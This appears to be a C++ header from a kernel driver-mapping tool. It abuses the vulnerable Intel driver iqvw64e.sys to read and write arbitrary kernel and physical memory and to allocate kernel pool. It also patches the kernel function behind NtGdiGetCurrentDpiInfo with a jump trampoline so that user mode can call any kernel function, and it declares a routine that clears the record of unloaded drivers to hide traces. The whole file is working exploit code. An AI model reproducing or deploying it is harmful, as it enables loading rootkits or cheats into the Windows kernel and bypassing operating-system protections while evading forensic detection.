#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

namespace intel_driver
{
	constexpr auto driver_name = "iqvw64e.sys";
	constexpr uint32_t ioctl1 = 0x80862007;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	HANDLE Load();
	void Unload(HANDLE device_handle);

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool GetNtGdiGetCurrentDpiInfoKernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments)
	{
		constexpr auto call_void = std::is_same_v<T, void>;

		 

		if constexpr (!call_void)
		{
			if (!out_result)
				return false;
		}
		else
		{
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call 
		LoadLibraryA("User32.dll");
		const auto NtGdiGetCurrentDpiInfo = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiGetCurrentDpiInfo"));

		if (!NtGdiGetCurrentDpiInfo)
		{
			std::cout << "[-] Failed to get export gdi32full.NtGdiGetCurrentDpiInfo" << std::endl;
			return false;
		}

		uint64_t kernel_function_ptr = 0;
		BYTE kernel_function_new_bytes[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
		
		static BYTE kernel_function_og_bytes[sizeof(kernel_function_new_bytes)];

		memcpy(kernel_function_new_bytes + 2, &kernel_function_address, sizeof(kernel_function_address));

		
		if (!GetNtGdiGetCurrentDpiInfoKernelInfo(device_handle, &kernel_function_ptr))
			return false;

		if (kernel_function_og_bytes[0] == 0)
			if (!ReadMemory(device_handle, kernel_function_ptr, kernel_function_og_bytes, sizeof(kernel_function_og_bytes)))
				return false;
	
		if (!WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_function_new_bytes, sizeof(kernel_function_new_bytes)))
			return false;

		if constexpr (!call_void)
		{

			const auto call = static_cast<T(__stdcall*)(A...)>(NtGdiGetCurrentDpiInfo);
			*out_result = call(arguments...);
		}
		else
		{
			const auto call = static_cast<void(__stdcall*)(A...)>(NtGdiGetCurrentDpiInfo);
			call(arguments...);
		}

		WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_function_og_bytes, sizeof(kernel_function_og_bytes));


		return true;
	 }
}